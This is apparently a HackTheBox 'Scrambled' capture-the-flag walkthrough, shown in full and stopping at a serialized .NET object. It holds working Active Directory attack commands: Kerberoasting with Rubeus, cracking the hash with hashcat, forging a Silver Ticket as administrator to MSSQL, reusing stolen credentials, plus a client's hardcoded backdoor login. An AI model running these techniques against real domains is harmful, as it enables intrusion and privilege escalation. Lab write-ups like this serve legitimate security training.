---
title: HTB: Scrambled [From Windows]
url: https://0xdf.gitlab.io/2022/10/01/htb-scrambled-win.html
date: 2022-10-01T13:45:00+00:00
tags: htb-scrambled, ctf, hackthebox, nmap, windows, domain-controller, kerberos, ldap, ldp.exe, kerberoast, rubeus, sharp-collection, hashcat, mssql, silver-ticket, crackstation, klist, sqlcmd, pssession, cff-explorer, reverse-engineering, wireshark, dnspy, deserialization, ysoserial.net
---

## Enumeration

### nmap

`nmap` finds many TCP ports:

```

PS > nmap -p- --min-rate 10000 10.10.11.168
Starting Nmap 7.70 ( https://nmap.org ) at 2022-06-09 16:00 Pacific Daylight Time
Nmap scan report for dc1.scrm.local (10.10.11.168)
Host is up (0.091s latency).
Not shown: 65513 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
4411/tcp  open  found
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49686/tcp open  unknown
49690/tcp open  unknown
54769/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.52 seconds

```

These look like the typical ports I would expect on a Windows DC, plus 80 (HTTP), 5985 (WinRM), 1433 (MSSQL), and something unknown on 4411. LDAP shows the full hostname as `DC1.scrm.local`. I’ll add both `DC1.scrm.local` and `scrm.local` to my `C:\Windows\System32\Drivers\etc\hosts` file.

Some quick checks show nothing that I can access without creds except for HTTP (80).

### Website - TCP 80

#### Site

The site is an internal site for Scramble Corp. It’s got some basic stats:

![image-20220609085132830](https://0xdfimages.gitlab.io/img/image-20220609085132830.png)

There are several links to different pages where I’ll collect bits of information.
- NTLM authentication is disabled:

  ![image-20220609085217106](https://0xdfimages.gitlab.io/img/image-20220609085217106.png)

</picture>
- A screenshot leaks a username, ksimpson:

  ![image-20220609085509745](https://0xdfimages.gitlab.io/img/image-20220609085509745.png)

</picture>
- There is a “New User Account” form, but it doesn’t seem to actually submit data, so seems not important.
- `/salesorders.html` has details on the “Sales Orders App”, which confirms the hostname / domain name from `nmap`, and also gives an indication of what TCP 4411 is used for:

  ![image-20220609085755427](https://0xdfimages.gitlab.io/img/image-20220609085755427.png)

</picture>
I’ll note there’s an option to “Enable debug logging”.
- `passwords.html` says:

  > **Password Resets**
  >
  > Our self service password reset system will be up and running soon but in the meantime please call the IT support line and we will reset your password. If no one is available please leave a message stating your username and we will reset your password to be the same as the username.

#### Tech Stack

All the pages load as `.html` files, which is a good indication this is a static site. The headers don’t show any additional indication of dynamic content:

```

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Thu, 04 Nov 2021 18:13:14 GMT
Accept-Ranges: bytes
ETag: "3aed29a2a7d1d71:0"
Server: Microsoft-IIS/10.0
Date: Thu, 09 Jun 2022 12:48:14 GMT
Connection: close
Content-Length: 2313

```

### LDAP - TCP 389

I’ll see what I can get from LDAP without creds. I’ll use `ldp.exe` to check LDAP. To install this, I’ll go into Settings > Apps > Optional Features > More Windows Features and add “Active Driectory Lightweight Directory Services”:

![image-20220609193224564](https://0xdfimages.gitlab.io/img/image-20220609193224564.png)

Now on running it, a old looking Windows GUI opens. “Connection” > “Connect” will pop up a dialog, and I’ll enter the IP or domain. Once I get to any kind of auth, I’ll have to give it the domain name, so I’ll use that now as well:

![image-20220609193512859](https://0xdfimages.gitlab.io/img/image-20220609193512859.png)

It provides the high level information about the domain:

![image-20220609193830445](https://0xdfimages.gitlab.io/img/image-20220609193830445.png)

There’s not much else without auth.

## Shell as MiscSvc

### SMB - TCP 445 [Auth]

#### Creds

This part is much easier on Windows than Linux. I’ll try ksimpson’s creds to see if the password happens to have been reset to match the username. To check, I’ll just `net use \\dc1.scrm.local\IPC$`:

```

PS > net use \\dc1.scrm.local\IPC$ /user:scrm.local\ksimpson ksimpson
The command completed successfully.

```

This means the creds are valid!

Once I’ve authed to `IPC$`, I can run `net view dc1.srcm.local`:

```

PS > net view dc1.scrm.local
Shared resources at dc1.scrm.local

Share name  Type  Used as  Comment
-------------------------------------------------------------------------------
HR          Disk
IT          Disk
NETLOGON    Disk           Logon server share
Public      Disk
Sales       Disk
SYSVOL      Disk           Logon server share
The command completed successfully.

```

Or go to `\\dc1.scrm.local` in Explorer:

![image-20220609201125415](https://0xdfimages.gitlab.io/img/image-20220609201125415.png)

#### Enumeration

ksimpson can’t access most of the shares:

![image-20220609201202514](https://0xdfimages.gitlab.io/img/image-20220609201202514.png)

`Public` is accessible and contains a single document:

![image-20220609201224975](https://0xdfimages.gitlab.io/img/image-20220609201224975.png)

#### Network Security Changes.pdf

The document is a letter from the IT staff to all employees:

[![](https://0xdfimages.gitlab.io/img/NetworkSecurityChanges.png-1-16547879035782.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/NetworkSecurityChanges.png-1-16547879035782.png)

This mentions again that NTLM is disabled because of an NTLM relay attack, and now everything is done via Kerberos. It also mentions that the SQL database has had access removed from the HR department.

### Kerberoast

#### Collect Challenge/Response

From Windows, I’ll Kerberoast with [Rubeus](https://github.com/GhostPack/Rubeus), downloading the latest from [SharpCollection](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Rubeus.exe), and running with the following options:
- `kerberoast` - command to run
- `/domain:scrm.local` - the domain to target
- `/dc:dc1.scrm.local` - this tells `rubeus` where to connect
- `/creduser:scrm.local\ksimpson` - username
- `/credpassword:ksimpson` - password
- `/nowrap` - make it easier to copy the resulting hash to a file

It dumps a challenge/response hash for the sqlsvc account:

```

PS > rubeus kerberoast /domain:scrm.local /dc:dc1.scrm.local /creduser:scrm.local\ksimpson /credpassword:ksimpson /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.3

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : scrm.local
[*] Searching path 'LDAP://dc1.scrm.local/DC=scrm,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : sqlsvc
[*] DistinguishedName      : CN=SqlSvc,OU=Service Accounts,DC=scrm,DC=local
[*] ServicePrincipalName   : MSSQLSvc/dc1.scrm.local:1433
[*] PwdLastSet             : 11/3/2021 9:32:02 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*sqlsvc$scrm.local$MSSQLSvc/dc1.scrm.local:1433@scrm.local*$877784029F06201235586B6DD1F9D80F$BA4205AAF905B11479B998A2FA01B6AC8F4ED523AD9C2CCB21353B4B1EAF6102B2453447EAF6CC624917B9D6B1EEAD915AA70D0A792FBC244A3201306AB63B19C934537703466E77CDDB82B9947003E20164964506724B65AAB26AB05C0407DAF5023D1317ADAC439C1597E9A2E8385FAEA1CD7467917DE30BD45017FC63186695C20C5A4F3B57620839B7DFF37F0126F1F8DEBDE930D09797983CD100B38F5D67FF932893C21FE2AC288485B52BB4E35C34BF626367DEC6AD6F84E8044251F2EDD25A51CA217E4DBEC6810D7A106064D4F2A31FD47D55D8F25409D73A5234800145226DCB76144E9331C83C424026E77ACF83C486EC385A66CEC1E7C4B385B93ED737B02A1EFE3ECC60ADAE64B7486779D33EF8D73F7530B4B0054B05289D3487F5A6511AD19AD66E79D7D7A5CEB22B5EC242960B83C142E0437F7512A720E8522A6419315375AD243FB953A27322CB20F38102F86932D1040093F8F98646A6AB81F349986E85854EA710FC03F4FED6804FC5954B76C7EB4AE57D66762ED89D2AD32944E8EE73FCFDD8A14F7171D7B271FE8B8B2492B1BCF9731DFC9FF823DACDD2CD51E2F1A1AC2AED793229CCC7699FBC5813881E53A3EA21351AF481DFA1224E611E9C1C22FCC08058CD7717E824CC8BAA2D5D74B9971A8B0BC015186E70E7C72D3AC9D3006E1318842EA0B74CD432E5A004846B59EFFA468111C96119F863E94E0A17B82E4D4301852CF7B68A26BEDF889935CD684D164F1A11D7882EE179B4586EBD57B6B9EC819DC041219D644FC20F84F37767589044832BBB2F65A2A1E87D24BC6BFA6E75E9F41851254746CCCF77E57919BC86AD02DFCB4144ED50655655A883864F54FBDDCC2561B76C13F70329B63822DB2321C488BFA2788FA664E1B09D57769036C62EB0DB7F88FB8C56169B64B532E88523E491AA1A1C89CA7C3DB4796FFA5D3FF8B867B49395898664204EF45FFAC4EAC6F76BD922A5D6F348FEA15A727622E3FCDDD8142B8A30FB85B4C8B5409A4B8884127B6AFC0EDB33CB6BE64D56DC5E3CFD4F9D8DFC4804A56CC31A52CD0A9565FFB0006342347E75439DBEE8543D13F602D305629C3EA65018F02B78A7A048176723CDA0AC36938FD4A2C7FE0DD24EDA3F5AD20FDAD8C9255E035034E324F07F36E594D1A08356691F4427389F68E71643A52E843FA2022A3234468280FA43F853DB2187DDD3ABB58BFBEC19AA338F6ECC0D15AEA906D45B30EA43EF0957F8ECD983E650172C9850D88441DAD565435AD0E64EB737A6A73CFAC7529F2908CE3BDE3B83395FC41C0C246698CB435E653D0E20A55BE870CE91BB5ED8B035D40FFE089FC3A90729DCC458E39FE9ADC47F2437FA2693D501B33E9626A5CA3F20514E16D5B6758D9A5C401ABBA26F274E82B2D7BD028A613A0120C5B52CABD3A27912C93A40A2B8E62C103443853AD59985778CA2A1D1A74C86C8D8D3292CA5E96FF656DDB7AF7E8C7E8EEDEF7FA2B2F293196AE88BC8D24553AD723C3C0DD3CFAD2E65215F1BD308E8B6602F81EAD5117E06E7

```

#### Crack It

I’ll save this to a file, and run it into `hashcat` (on Linux, but it runs the same either way) with `rockyou.txt`:

```

$ hashcat mssqlsvc-hash /usr/share/wordlists/rockyou.txt
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol
...[snip]...
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$e072073f4a55e5da82ffb47a79b1af27$435b563903b2fe93226ec9fa2ed61cf27100fb95cdad338fadde59bca765a353acbde62dd57069c0aaf233df91242c37941f2a77ab4181e79e706b663b319dd9cae533a998ea153863deecfc781fd164d1ddd8533646c2cf520788e8327b8e6f8d1cebc18aabff1d59175d1feceb46ef1c57f155b3fcba5bea23d756f332c34d87098bee05ff5f5c4efeae137d09b32ddf96f83aeb1697206c3bd387b18391a55e3e8696a8ce949f7263cd2ca894a43ccb1da0bf66918c0a62ba3e773b261aa2def3e9b8655c23f35ad920a70ed0fb74295cf88080e191f2389737ee8b06fd2e83aa073f24d9a6957625aba34b3930b888f82533dbee813b1db482cbe289cc665445227422d3771dee941e5889f3f8d92ee4bc2008a0abcfab9d3f16b5455131b55b9700ab1ddb44c639364fdfc32f566ce57c394866b1562a3430811bcae36f6dac2392aa6bb83db95e5ead924e870ff9c14cf5f6ce8f98e79cb7cd9fb23b3b36b92933ec7c5534df731bb851b931d974f86fdac987a2eea7f9d103c931b1d9625daa4b2d4a2164771ddb5aeaed601b46ef8588bd14e876d4b6bb8f1054777ec17b011ed48426a9af7e55fac84784ab00de9d27b63ed21481b782bc39775d263f875f2588eccdb7a8aadd81f5d9b0bbe0d429f251688de9b4e5dfe62f9ff04a1246bb4a46a7b2b5ff6aa41cf9dc544cb793253348e31f513df1fe0b92ef687fbcb6235cb284e648a1e6d24a896084266b53897255f0f0464af0527b34fc2411e4532dac626abc153913bfa830c638418999d8272740f6b2871ec8820104f4e45c4aad639c160bcdfac6e8b4ca0f0c4313d592e7a0f5448c0f8e8f1b45c7b3ad0105585a5fae2a369b89d790db71e03d1d27cebdbf0b60ebc291d12f38aa62a97c3ab7cbca9bf28104089850386cc7008b0f00bc92bb17bd7c43c210b935f4035e00342e7bb9690afb9b7a1f8e73ee5ec065a5096e1b786e92faa32ca85209e9595d0cc7f2da26e8d9ea64aa49938c16169fe6b094426bbeb9b362929c00d853dc89488b22af4c753d2d32ae448cff1e5b89aac5c608046d911ac245dfe0aa7dfe92973807c5f655eb7ac25496aa1a7e1618d87b45fe2546857fbfc6d4dfe45acb1dc95774a1e7599980715dc6cb213b15873064ed08c70334efd247866d75718c2012207604ed02c4937026eb080ffea605173722f9fba39318a215cdef702be8ca84c43d446837d04be4b16851b0890c42cb95ed43c9f3f99f00bd22c157258f34c242bd77d2006d56eac7b52612838c9554cf4bcd7933f337ef6eda88fa9b00610cf7598c5fb3f5b9aa1223a53423a257c30d00dd1c4f9dd51bef4df1760f4e9273c2e16021da0dfc38fd98c81ed0f1667b97ee4e0bab6790ccd8d675bf7fdeae8e97f25aa0558b4ae858bfc1e5553485afba9084d877a20816:Pegasus60
...[snip]...

```

In less than a minute on my system it breaks to “Pegasus60”.

### MSSQL Access

#### Silver Ticket Background

These creds don’t actually directly allow access to anything new for me. But because this account is running the SQL service, I can use the password to perform a Silver Ticket attack. [This overview](https://adsecurity.org/?p=2011) from adsecurity.org is really good. A Silver Ticket is a forged TGS (Ticket Granting Service) ticket, which is used directly between the client and the service, without necessarily going to the DC. Instead, the TGS ticket is signed by the service account itself, and thus the Silver Ticket is limited to authenticating only the service itself.

To create a Silver Ticket, an attacker needs:
1. The NTLM hash of the password for the service account;
2. The SID of the domain
3. The service principle name (SPN) associated with the account.

I already acquired the SPN with `GetUserSPNS.py` above, `MSSQLSvc/dc1.scrm.local:1433`.

#### Generate NTLM

Rubeus will calculate this:

```

PS \> rubeus hash /password:Pegasus60
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.3

[*] Action: Calculate Password Hash(es)

[*] Input password             : Pegasus60
[*]       rc4_hmac             : B999A16500B87D17EC7F2E2A68778F05

```

[CrackStation](https://crackstation.net/) verifies it is correct:

![image-20220609132540783](https://0xdfimages.gitlab.io/img/image-20220609132540783.png)

#### Domain SID

To get authenticated access to LDAP, back in `ldp.exe`, “Connection” > “Bind”, and fill out that form with ksimpson’s info:

![image-20220609201416804](https://0xdfimages.gitlab.io/img/image-20220609201416804.png)

On clicking OK, it shows success/failure in the panel:

![image-20220609201448047](https://0xdfimages.gitlab.io/img/image-20220609201448047.png)

To get this to work, I had to increase the value of `LmhostsTimeout` in my registry as shown [here](https://learn.microsoft.com/en-us/troubleshoot/windows-server/remote/network-name-cannot-found-fqdn-remote-computer).

“Browse” > “Search” opens a small dialog, where I’ll say I want to find users:

![image-20220609204200700](https://0xdfimages.gitlab.io/img/image-20220609204200700.png)

I’ll find any user, and get their SID:

![image-20220609204353794](https://0xdfimages.gitlab.io/img/image-20220609204353794.png)

Domain SID: `S-1-5-21-2743207045-1827831105-2542523200`.

#### Generate Ticket

Rubeus can craft the Silver ticket with the information collected using the following options:
- `silver` - the name of the attack
- `/domain:scrm.local` - the domain to generate for
- `/dc:dc1.scrm.local` - the domain controller
- `/sid:[domain sid]` - the domain’s SID
- `/rc4:[hash]` - service account valid NTLM hash
- `/user:administrator` - the account to generate the ticket for
- `/service:[SPN]` - the service principle name (SPN) for the service being exploited
- `/ptt` - import the generated ticket into my current session

It generates a ticket:

```

PS > rubeus silver /domain:scrm.local /dc:dc1.scrm.local /sid:S-1-5-21-2743207045-1827831105-2542523200 /rc4:B999A16500B87D17EC7F2E2A68778F05 /user:administrator /service:MSSQLSvc/dc1.scrm.local:1433 /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.3

[*] Action: Build TGS

[*] Building PAC

[*] Domain         : SCRM.LOCAL (SCRM)
[*] SID            : S-1-5-21-2743207045-1827831105-2542523200
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : B999A16500B87D17EC7F2E2A68778F05
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : B999A16500B87D17EC7F2E2A68778F05
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : MSSQLSvc
[*] Target         : dc1.scrm.local:1433

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'administrator' to 'MSSQLSvc/dc1.scrm.local:1433'

[*] AuthTime       : 6/9/2022 5:47:08 PM
[*] StartTime      : 6/9/2022 5:47:08 PM
[*] EndTime        : 6/10/2022 3:47:08 AM
[*] RenewTill      : 6/16/2022 5:47:08 PM

[*] base64(ticket.kirbi):

      doIFXTCCBVmgAwIBBaEDAgEWooIEVTCCBFFhggRNMIIESaADAgEFoQwbClNDUk0uTE9DQUyiKjAooAMC
      AQKhITAfGwhNU1NRTFN2YxsTZGMxLnNjcm0ubG9jYWw6MTQzM6OCBAYwggQCoAMCARehAwIBA6KCA/QE
      ggPwBU6QF5beKdCajKn36Uash4C+62mheMd/bKcRD/GruUDYWT6qTmaKJyDyQ7MO5lsRYg5to1ro3UlZ
      wqGg/bdATMiEAaL9dljgSr3eoDY451uNDhD0WWLUvpKd2R7ZvjGX5sL+93BuiJ2DKA3ySZM6T0UhNpF7
      rK+IyO+1hRjHV8Ir6XsV1K5ax3OlVxk+9nndtimy/pSb9rZm4eBBwJQw/r4ANAg6SpJj7Matew6Gb269
      0x8AwD7Wvnu+MWtXzrL69P6XhY0pwbQV8BNjK/G3g8J1WubCt3hA3S/JMKOikIvN3P5O2jJCR0FT+XL+
      6TzgkxUwRtd3m3nhqrlRQBDqJo9HeuwrMRI6mWji78ltoYbWCh4bFi/Bv32SgvdhyChZ/Ban6N2ULE58
      nxLyHavN8YOG79XB9I2RqOzEAFJNxmRqYEdD+qGYEM+wyfCFqxU7OOJg+2mYF41BtzmP/2YZDW33hNLD
      O0NoOnVkiKBZOruATpvhaSKyLDtbqgeZnbn4532r1i/sRPWo5NEBiq4yvPqw+C1JBxVIizZ8QFDnIEQN
      OR4AWZeC2NiZbWdXKErRGQvkI06mjTETsf6iLbevnL79n9RVUr2S4J7VaGXSjkc8rg74bpOSWCcBDW5l
      o0AU7zxP40nEPs1nNoNqE4tRzLWLU8cwN6iW+TuBAfJ9YnxMRLgZ4LwSX2FCtsS2NSzq5BCjrlJbu8Pv
      kWoOP0qMVCN48QkWm1FSDxou6ypVDDE4oypFlKmlfogJ5IU5R2D1qkY+dVbVXsS4G3t2gCDC1uGWJx6F
      SZ0lH5xniPhfY+A79tgor0vVStWXx5jkberclY4EE96uZFFV/NxAZuKppV7w/5WNVytdXnODBKRZOOTo
      fVCpjr2LNbbI2GpUpQWBd8v3B83RNU+b6YKgcTqQBq8zjCgjdT/rJj8etH3RhKzy6nUfq7ycr0aYx7vP
      pGfL41NzEIcjHqYtotqE4N8jLmta20wqIBH1U1vNp0SUWM+YjsQgnEu0HJpa8NQgpYvgjBFNQ5l6jPgn
      7FS5KA3s5alsuNS1OfIHi8RnXw7ZF3sYIj5bMYUeqIgHLB/H6qkBMv/82seVztq3eH1jL82W/ocsTInq
      UZVoULlfivB0YtELpj+bBScmLLj2tV6hzaYfF9bsQ8fz5Ddx8dULQPnILJFEt/VEysh9A/zO+Vyl4eMT
      AJmfPh4+sjD7GqSyZgpGDstfwDGS8b4lsZv8ozpk2IJXq/BT93M5YbW6fbzHdA51apL5/3OQdVwtGDSo
      pJ6tyqD0f7kyWvcEf4hevjHhIXMHK7MouI/14w+5fKkCxz2GV8PczyO1iwHPShodLtG/o4HzMIHwoAMC
      AQCigegEgeV9geIwgd+ggdwwgdkwgdagGzAZoAMCARehEgQQJo2R4xtHln1ffPojYfqcnqEMGwpTQ1JN
      LkxPQ0FMohowGKADAgEBoREwDxsNYWRtaW5pc3RyYXRvcqMHAwUAQKAAAKQRGA8yMDIyMDYxMDAwNDcw
      OFqlERgPMjAyMjA2MTAwMDQ3MDhaphEYDzIwMjIwNjEwMTA0NzA4WqcRGA8yMDIyMDYxNzAwNDcwOFqo
      DBsKU0NSTS5MT0NBTKkqMCigAwIBAqEhMB8bCE1TU1FMU3ZjGxNkYzEuc2NybS5sb2NhbDoxNDMz

[+] Ticket successfully imported!

```

By including `/ptt` at the end, it will import that forged ticket into my current session so I can use it without specifying it. I can see that ticket with `klist`:

```

PS > klist

Current LogonId is 0:0x1e1ed

Cached Tickets: (1)

#0>     Client: administrator @ SCRM.LOCAL
        Server: MSSQLSvc/dc1.scrm.local:1433 @ SCRM.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 6/9/2022 17:47:08 (local)
        End Time:   6/10/2022 3:47:08 (local)
        Renew Time: 6/16/2022 17:47:08 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:

```

#### Connect

To interact with MSSQL from my Windows 10 host, I’ll download and install the [Microsoft ODBC Driver 17 for SQL Server (x64)](https://docs.microsoft.com/en-us/sql/connect/odbc/download-odbc-driver-for-sql-server?view=sql-server-ver16) and then the [Microsoft Command Line Utilieis 15 for SQL Server](https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility?view=sql-server-ver16). Now I can connect:

```

PS > sqlcmd -S dc1.scrm.local
1>

```

To show that that is using the ticket, I’ll run `klist purge` to clear my tickets:

```

PS > klist purge

Current LogonId is 0:0x1e1ed
        Deleting all tickets:
        Ticket(s) purged!
PS > sqlcmd -S dc1.scrm.local
Sqlcmd: Error: Microsoft ODBC Driver 17 for SQL Server : Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication..

```

It fails. After running the rubeus `silver` command again, it will connect using the generated silver ticket.

### MSSQL Enumeration

#### Find Password

I’ll start by listing the databases:

```

1> select name, database_id from sys.databases;
2> go
name                                      database_id
------------------------------------------ -----------
master                                              1
tempdb                                              2
model                                               3
msdb                                                4
ScrambleHR                                          5

(5 rows affected)

```

`ScrambleHR` seems interesting. It has three tables:

```

1> SELECT TABLE_NAME FROM ScrambleHR.INFORMATION_SCHEMA.TABLES;
2> go
TABLE_NAME
------------------------------------------
Employees
UserImport
Timesheets

(3 rows affected)

```

The `Employees` and `Timesheets` tables are empty. There’s one row in `UserImport`:

```

1> SELECT * from ScrambleHR.dbo.UserImport;
2> go
LdapUser               LdapPwd                LdapDomain             RefreshInterval   IncludeGroups   
--------------------   --------------------   --------------------   ---------------   -------------   
MiscSvc                ScrambledEggs9900      scrm.local                          90               0 
(1 rows affected)

```

#### Execute

MSSQL has the ability to run commands via the `xp_cmdshell` stored procedure. It is possible to do so here, but the service account doesn’t have access to much of anything on the box, and it was meant to largely be a dead end.

It does lead to a couple unintended paths, which I’ll show in [Beyond Root](/2022/10/01/htb-scrambled-beyond-root.html).

### PS Session

Getting a shell with PowerShell on Windows *should* be easier in theory, but it is quite finicky. I had to play with a lot of things, and I’m not 100% sure what made it work. I did go through the steps I showed in [Helpline](/2019/08/17/htb-helpline-win.html#enable-winrm) to configure WinRM and it’s trusted hosts. I also tried setting the DNS server for my VPN adapter to Scrambled’s IP. It’s pretty hard to pinpoint exactly what worked. But eventually, it did:

```

PS > Enter-PSSession dc1.scrm.local -Credential scrm.local\MiscSvc

Windows PowerShell credential request
Enter your credentials.
Password for user scrm.local\MiscSvc: *****************

[dc1.scrm.local]: PS C:\Users\miscsvc\Documents>

```

And grab `user.txt`:

```

[dc1.scrm.local]: PS C:\Users\miscsvc\Documents> type c:\users\miscsvc\desktop\user.txt
8d9496bc************************

```

For whatever reason, this shell isn’t as slow through Windows, so I’ll skip getting a Netcat shell.

## Shell as System

### Enumeration

As MiscSvc, I have access to the IT share now (the others are still access denied):

```

[dc1.scrm.local]: PS C:\shares> ls

    Directory: C:\shares

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       01/11/2021     15:21                HR
d-----       03/11/2021     19:32                IT
d-----       01/11/2021     15:21                Production
d-----       04/11/2021     22:23                Public
d-----       03/11/2021     19:33                Sales

[dc1.scrm.local]: PS C:\shares> cd IT
cd IT
[dc1.scrm.local]: PS C:\shares\IT> ls

    Directory: C:\shares\IT

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       03/11/2021     21:06                Apps
d-----       03/11/2021     19:32                Logs
d-----       03/11/2021     19:32                Reports 

```

In the `Apps` folder, there are two executables, `ScrambleClient.exe` and `ScrambleLib.dll`:

```

[dc1.scrm.local]: PS C:\shares\IT\Apps\Sales Order Client> ls

    Directory: C:\shares\IT\Apps\Sales Order Client

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       05/11/2021     20:52          86528 ScrambleClient.exe
-a----       05/11/2021     20:52          19456 ScrambleLib.dll    

```

I’ll download both of these over SMB, first by removing my previous auth:

```

PS > net use /d \\dc1.scrm.local\IPC$
\\dc1.scrm.local\IPC$ was deleted successfully.

```

And now connecting as miscsvc:

```

PS > net use \\dc1.scrm.local\IPC$ /user:scrm.local\miscsvc ScrambledEggs9900
The command completed successfully.

```

![image-20220610103912125](https://0xdfimages.gitlab.io/img/image-20220610103912125.png)

I’ll copy each to my PC.

### ScrambleClient Reverse

#### Files

On Windows, [CFF Explorer](https://ntcore.com/?page_id=388) will show metadata about a PE:

![image-20220610104415254](https://0xdfimages.gitlab.io/img/image-20220610104415254.png)

![image-20220610104425877](https://0xdfimages.gitlab.io/img/image-20220610104425877.png)

Both are 32-bit .NET executables.

#### Connect

I’ll jump over to a Windows VM. Running the EXE pops the same windows from the IT pages:

![image-20220609162004978](https://0xdfimages.gitlab.io/img/image-20220609162004978.png)

With my VPN connected and my `C:\Windows\System32\drivers\etc\hosts` file updated, I’ll click “Edit” and enter the server (the port is already filled):

![image-20220609162249611](https://0xdfimages.gitlab.io/img/image-20220609162249611.png)

I’ll also check the “Enable debug logging” box.

Trying to “Sign In” with any of the creds I have fails:

![image-20220609162352795](https://0xdfimages.gitlab.io/img/image-20220609162352795.png)

If I try that again with WireShark, it shows it’s a text-based protocol:

![image-20220609162450697](https://0xdfimages.gitlab.io/img/image-20220609162450697.png)

#### Credentials

Opening the binaries in [DNSpy](https://github.com/dnSpy/dnSpy), I’ll start with an overview of the files:

![image-20220609162820128](https://0xdfimages.gitlab.io/img/image-20220609162820128.png)

`LoginWindow` seems promising. Several functions down, there’s a `Logon` function:

```

private void Logon(object CredsObject)
{
    bool logonSuccess = false;
    string errorMessage = string.Empty;
    NetworkCredential networkCredential = (NetworkCredential)CredsObject;
    try
    {
        logonSuccess = this._Client.Logon(networkCredential.UserName, networkCredential.Password);
    }
    catch (Exception ex)
    {
        errorMessage = ex.Message;
    }
    finally
    {
        this.LoginComplete(logonSuccess, errorMessage);
    }
}

```

Clicking on the `Logon` that’s called from `this._Client.Logon` jumps over into the `ScrambleNetClient` class in `ScrambleLib`, where `Logon` is defined:

```

public bool Logon(string Username, string Password)
{
    bool result;
    try
    {
        if (string.Compare(Username, "scrmdev", true) == 0)
        {
            Log.Write("Developer logon bypass used");
            result = true;
        }
        else
        {
            ...[snip]...
        }

```

There’s a backdoor account if the username is “scrmdev”!

Going back to the app, changing the username to that works:

![image-20220609163215950](https://0xdfimages.gitlab.io/img/image-20220609163215950.png)

#### LIST\_ORDERS

In WireShark, there’s a new TCP stream (not from the login, as I bypassed that) fetching orders:

![image-20220609163421816](https://0xdfimages.gitlab.io/img/image-20220609163421816.png)

The client send `LIST_ORDERS;` on successful login. The returned base64 string is a serialized .NET object:

```

